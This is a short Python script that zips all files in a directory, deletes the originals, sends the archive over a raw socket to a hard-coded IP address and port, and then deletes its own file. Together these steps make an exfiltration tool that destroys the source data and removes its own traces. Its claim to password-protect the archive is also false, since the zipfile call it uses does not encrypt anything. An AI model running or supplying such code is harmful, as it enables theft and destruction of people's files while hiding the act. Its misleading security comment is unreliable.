
# zip-protect-send-delete.py

import zipfile
import os
import socket

# Define the directory containing the files to zip and send
source_dir = "/path/to/source/directory"

# Define the name for the zip file to create
zip_file_name = "my_files.zip"

# Define the password for the zip file
zip_password = "my_password"

# Define the IP address and port number of the destination server
ip_address = "192.168.1.100"
port = 1234

# Create a zip file of the files in the source directory and set a password
with zipfile.ZipFile(zip_file_name, "w", zipfile.ZIP_DEFLATED) as my_zip:
    for file_name in os.listdir(source_dir):
        file_path = os.path.join(source_dir, file_name)
        my_zip.write(file_path, os.path.basename(file_path))
    my_zip.setpassword(zip_password.encode())

# Delete the original files
for file_name in os.listdir(source_dir):
    file_path = os.path.join(source_dir, file_name)
    os.remove(file_path)

# Open a connection to the destination server
my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_socket.connect((ip_address, port))

# Send the zip file over the network connection
with open(zip_file_name, "rb") as my_file:
    while True:
        data = my_file.read(1024)
        if not data:
            break
        my_socket.send(data)

# Close the network connection
my_socket.close()

# Delete the zip file
#os.remove(zip_file_name)
# Delete itself 
os.remove(__file__)
